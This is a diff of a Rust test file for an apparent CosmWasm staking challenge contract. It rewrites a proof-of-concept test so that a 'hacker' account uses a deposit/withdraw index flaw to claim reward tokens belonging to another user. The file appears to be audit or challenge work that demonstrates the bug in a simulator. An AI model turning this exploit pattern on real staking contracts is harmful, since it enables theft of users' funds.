@@ -5,7 +5,7 @@ pub mod tests {
         msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
         state::{State, UserRewardInfo},
     };
-    use cosmwasm_std::{coin, Addr, Decimal, Empty, Uint128};
+    use cosmwasm_std::{coin, Addr, BankMsg, CosmosMsg, Decimal, Empty, Uint128};
     use cw_multi_test::{App, Contract, ContractWrapper, Executor};
 
     pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
@@ -411,60 +411,87 @@ pub mod tests {
         assert_eq!(user_info.pending_rewards, Uint128::zero());
     }
 
-    // We demonstrate how USER can gain an unfair amount of rewards 
+    const HACKER: &str = "hacker";
+
+    // We demonstrate how USER can gain an unfair amount of rewards
     #[test]
-    fn exploit_incremental_withdraw_flaw() {
+    fn exploit_withdraw_invariant_violation() {
         // Base scenario
         let (mut app, contract_addr) = proper_instantiate();
+        app = mint_tokens(app, HACKER.to_owned(), Uint128::new(20_000));
 
+        // Hacker stakes 1 token and withdraws to empty balance
+        app.execute_contract(
+            Addr::unchecked(HACKER),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(1, DENOM)],
+        )
+        .unwrap();
+        // withdraw to empty balance
+        app.execute_contract(
+            Addr::unchecked(HACKER),
+            contract_addr.clone(),
+            &ExecuteMsg::Withdraw {
+                amount: Uint128::new(1),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // Say owner increases rewards
+        app = mint_reward_tokens(app, OWNER.to_owned(), Uint128::new(10_000));
+        app.execute_contract(
+            Addr::unchecked(OWNER),
+            contract_addr.clone(),
+            &ExecuteMsg::IncreaseReward {},
+            &[coin(10_000, REWARD_DENOM)],
+        )
+        .unwrap();
+        // Hacker should be entitled to 0 tokens per spec
+        // but can get much more by abusing `withdraw` flaw.
+        // Deposits but `user_index` does not get updated on `Deposit {}`
+        app.execute_contract(
+            Addr::unchecked(HACKER),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(20_000, DENOM)],
+        )
+        .unwrap();
         let user_info: UserRewardInfo = app
             .wrap()
             .query_wasm_smart(
                 contract_addr.clone(),
                 &QueryMsg::User {
-                    user: USER.to_string(),
+                    user: HACKER.to_string(),
                 },
             )
             .unwrap();
-        // Pending rewards initially 10_000 
         assert_eq!(
-            user_info, 
+            user_info,
             UserRewardInfo {
-                staked_amount: Uint128::new(10_000),
-                user_index: Decimal::one(),
-                pending_rewards: Uint128::new(10_000),
+                // Query uses `update_rewards`
+                user_index: Decimal::from_atomics(2u128, 0).unwrap(),
+                // But look, pending rewards is messed up
+                pending_rewards: Uint128::new(20_000),
+                staked_amount: Uint128::new(20_000),
             }
         );
-
-        // EXPLOIT: incremental withdraws
-        for _ in 0..100 {
-            app.execute_contract(
-                Addr::unchecked(USER),
-                contract_addr.clone(),
-                &ExecuteMsg::Withdraw {
-                    amount: Uint128::new(1),
-                },
-                &[],
-            )
-            .unwrap();
-        }
-        let user_info: UserRewardInfo = app
+        // Claim rewards gives outsized reward for 0 staked when owner increases rewards
+        app.execute_contract(
+            Addr::unchecked(HACKER),
+            contract_addr.clone(),
+            &ExecuteMsg::ClaimRewards {},
+            &[],
+        )
+        .unwrap();
+        // Rewards balance is outsized
+        let rewards = app
             .wrap()
-            .query_wasm_smart(
-                contract_addr.clone(),
-                &QueryMsg::User {
-                    user: USER.to_string(),
-                },
-            )
+            .query_balance(HACKER.to_string(), REWARD_DENOM)
             .unwrap();
-        // Pending rewards initially 10_000 
-        assert_eq!(
-            user_info, 
-            UserRewardInfo {
-                staked_amount: Uint128::new(9_900),
-                user_index: Decimal::one(),
-                pending_rewards: Uint128::new(10_000),
-            }
-        ); 
+        // 20_000 because USER has not claim their rewards above,
+        // and hacker can claim it all
+        assert_eq!(rewards.amount, Uint128::new(20_000));
     }
 }
